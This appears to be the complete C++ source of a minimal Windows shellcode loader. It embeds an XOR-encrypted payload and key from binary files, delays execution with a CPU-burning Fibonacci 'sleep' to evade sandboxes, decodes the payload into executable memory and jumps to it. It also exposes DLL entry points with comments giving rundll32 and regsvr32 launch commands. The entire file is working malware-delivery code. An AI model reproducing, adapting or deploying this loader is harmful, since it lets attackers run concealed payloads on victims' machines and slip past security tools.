#include <windows.h>
#include <cstdio>

asm(R"(
buf:
    .incbin "buf.bin"
buf_end:
    .byte 0

    .balign 1
buf_size:
    .int buf_end - buf

key:
    .incbin "key.bin"
key_end:
    .byte 0

    .balign 1
key_size:
    .int key_end - key
)");

extern const unsigned char buf[];
extern const int buf_size;

extern const unsigned char key[];
extern const int key_size;

size_t fib(const size_t x) noexcept {
    if ((x == 1) || (x == 0)) {
        return x;
    } else {
        return fib(x - 1) + fib(x - 2);
    }
}

DWORD run(__attribute__((unused)) void* param) noexcept {
#ifndef MINILDR_NO_SLEEP
    printf("%zu\n", fib(45));  // computational sleep
#endif
    auto address = (char*) VirtualAlloc(nullptr, buf_size, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!address) return 1;
    for (int i = 0; i < buf_size; ++i) {
        address[i] = buf[i] ^ key[i % key_size];  // xor decode
    }
    ((void(*)()) address)();  // jump
    return 0;
}

int main() noexcept {
    run(nullptr);
    return 0;
}

bool DllMain(__attribute__((unused)) HINSTANCE module, DWORD reason, __attribute__((unused)) VOID* reserved) {
    switch (reason) {
        case DLL_PROCESS_ATTACH:
#ifdef MINILDR_DLL_AUTOLOAD
            CreateThread(nullptr, 0, &run, nullptr, 0, nullptr);
#endif
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return true;
}

extern "C" {
    // rundll32.exe mini.dll,DllInstall
    // regsvr32.exe /s /n /i mini.dll
    __declspec(dllexport) void __cdecl DllInstall() {
#ifndef MINILDR_DLL_AUTOLOAD
        main();
#endif
    }

    // rundll32.exe mini.dll,DllRegisterServer
    // regsvr32.exe /s mini.dll
    __declspec(dllexport) void __cdecl DllRegisterServer() {
#ifndef MINILDR_DLL_AUTOLOAD
        main();
#endif
    }

    // rundll32.exe mini.dll,DllUnregisterServer
    // regsvr32.exe /s /u mini.dll
    __declspec(dllexport) void __cdecl DllUnregisterServer() {
#ifndef MINILDR_DLL_AUTOLOAD
        main();
#endif
    }
}
